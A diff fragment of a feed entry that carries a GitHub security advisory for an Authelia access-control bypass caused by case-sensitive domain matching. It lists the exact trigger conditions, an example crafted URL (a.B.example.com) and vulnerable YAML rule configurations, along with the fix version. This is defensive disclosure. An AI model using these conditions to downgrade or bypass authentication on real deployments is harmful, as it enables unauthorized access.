-<p>CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N/E:P/CR:H/IR:L/AR:L/MAV:N/MAC:H/MAT:P/MPR:L/MVC:L/MVI:N/MVA:N/MSC:L/MSI:N/MSA:N/S:N/AU:Y/R:U/V:D/RE:L/U:Amber</p>
-</blockquote>
-<p><strong>CVSSv3.1 Baseline Score:</strong> Low 3.1</p>
-<p><strong>CVSSv3.1 Overall Score:</strong> Low 3.4</p>
-<p>The full CVSSv3.1 Vector equivalent for this vulnerability is:</p>
-<blockquote>
-<p>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C/CR:H/IR:L/AR:L/MAV:N/MAC:H/MPR:L/MUI:X/MS:U/MC:L/MI:N/MA:N</p>
-</blockquote>
-<p>The weighted severity rating is a result of no indication this is currently being exploited being available at the time of the publish date, in addition to the fact it's unlikely that it is being exploited currently. The vectors have been picked based on the scenario most likely to exist in real configurations.</p>
-<p>In addition to the weighting our assessment considers the fact the configuration scenario required for this vulnerability to be exploited is highly unlikely and an attacker is unlikely in most scenarios to be able to determine if the exploit is available and if it was successful except in rare situations. Though the visibility to the attacker was not reflected in our assessment.</p>
-<h3 id="summary">Summary</h3>
-<p>Due to lack of canonicalization of domains in very specific edge cases an access control rule may be skipped when it should match a request.</p>
-<h3 id="details">Details</h3>
-<p>This attack vector must be executed in a highly specific scenario which we do not believe any user would find themselves in. In an abundance of caution we are issuing this advisory and would appreciate any users who find this configuration report it to us with both the access control section, and sessions section so that we can best advise the community of the actual impact.</p>
-<p>The specific conditions that could lead to a security issue for vulnerability are as follows:</p>
-<ol>
-<li>The specific target resource of the attack must be using the forwarded authorization integration.</li>
-<li>The requested domain must have two additional segments compared to a session domain i.e. <code>a.b.example.com</code> is requested, but the session domain is <code>example.com</code>.</li>
-<li>There access control rules must specify two separate rules which both contain inexact domain matches such as <code>*.b.example.com</code> and <code>*.example.com</code> i.e. wildcards, username matches, group matches.</li>
-<li>The rules must be in order of most specific domain to least specific domain.</li>
-<li>The second rule must be <strong>more permissive</strong> than the first rule.</li>
-<li>The second rule must also <strong>match all criteria</strong> of the given request.</li>
-<li>The attacker must specifically request a URL for the more specific domain, with the second part containing one or more capitalized letters i.e. <code>https://a.B.example.com</code> and no other segment with capitalized letters.</li>
-<li>The integration used must not be the Envoy ExtAuthz integration.</li>
-<li>The proxy must not canonicalize the requested host name in the relevant header before sending it to the relevant authorization endpoint.</li>
-</ol>
-<p>The kind of configuration used to produce this issue and result in a <code>bypass</code> rule being matched has long been highly discouraged. Essentially hosts which should be bypassed entirely should not be secured by having the proxy check them with the authorization handlers.</p>
-<p>It should also be noted this has been heavily mitigated due to another bug where the session domain would not match if any part of the configured session domain was capitalized (fixed in <a href="https://github.com/authelia/authelia/commit/368631ecc5a9c6bcf2ff5f892ad443b890dd945e">https://github.com/authelia/authelia/commit/368631ecc5a9c6bcf2ff5f892ad443b890dd945e</a>, it should be expressly noted this commit does not contain a fix for a CVE). This bug would prevent the request from succeeding in any way. This bug will also be fixed after this vulnerability is fixed, and the bug where session domains would not match has no security impact other than heavily mitigating the access control vulnerability.</p>
-<h3 id="patches">Patches</h3>
-<p>Upgrade to 4.39.20.</p>
-<p>Commit: <a href="https://github.com/authelia/authelia/commit/b6d1d60baa02f216fdb19f5dfeaf2e805829508a">https://github.com/authelia/authelia/commit/b6d1d60baa02f216fdb19f5dfeaf2e805829508a</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>See the below examples for configurations to avoid.</p>
-<h4 id="examples">Examples</h4>
-<h5 id="1fa-downgrade">1FA Downgrade</h5>
-<p>The following example could result in a 1FA downgrade.</p>
-<p><strong>Request URL:</strong> <code>https://a.B.example.com</code></p>
-<p><strong>Configuration:</strong></p>
-<pre><code class="language-yaml">session:
-  cookies:
-    - domain: 'example.com'
-      authelia_url: 'https://example.com'
-access_control:
-  rules:
-     - domain: '*.b.example.com'
-       policy: 'two_factor'
-     - domain: '*.example.com'
-       policy: 'one_factor'
-</code></pre>
-<h5 id="bypass-downgrade">Bypass Downgrade</h5>
-<p>The following example could result in a bypass downgrade. It should be noted that configurations like this have long been discouraged. The domains matching the pattern <code>*.example.com</code> should not be configured to forward authorization requests to Authelia in most situations.</p>
-<p><strong>Request URL:</strong> <code>https://a.B.example.com</code></p>
-<p><strong>Configuration:</strong></p>
-<pre><code class="language-yaml">session:
-  cookies:
-    - domain: 'example.com'
-      authelia_url: 'https://example.com'
-access_control:
-  rules:
-     - domain: '*.b.example.com'
-       policy: 'two_factor'
-     - domain: '*.example.com'
-       policy: 'bypass'
-</code></pre>
-<h5 id="unaffected-scenario">Unaffected Scenario</h5>
-<p>The following configuration is unaffected regardless of the request.</p>
-<pre><code class="language-yaml">session:
-  cookies:
-    - domain: 'example.com'
-      authelia_url: 'https://example.com'
-access_control:
-  rules:
-     - domain: 'b.example.com'
-       policy: 'two_factor'
-     - domain: '*.example.com'
-       policy: 'one_factor'
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/authelia/authelia/security/advisories/GHSA-j748-h363-wqj8">https://github.com/authelia/authelia/security/advisories/GHSA-j748-h363-wqj8</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48794">https://nvd.nist.gov/vuln/detail/CVE-2026-48794</a></li>
-<li><a href="https://github.com/authelia/authelia/commit/b6d1d60baa02f216fdb19f5dfeaf2e805829508a">https://github.com/authelia/authelia/commit/b6d1d60baa02f216fdb19f5dfeaf2e805829508a</a></li>
-<li><a href="https://github.com/advisories/GHSA-j748-h363-wqj8">https://github.com/advisories/GHSA-j748-h363-wqj8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j748-h363-wqj8</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-26T22:32:21.000Z</published>
     </entry>
 </feed>
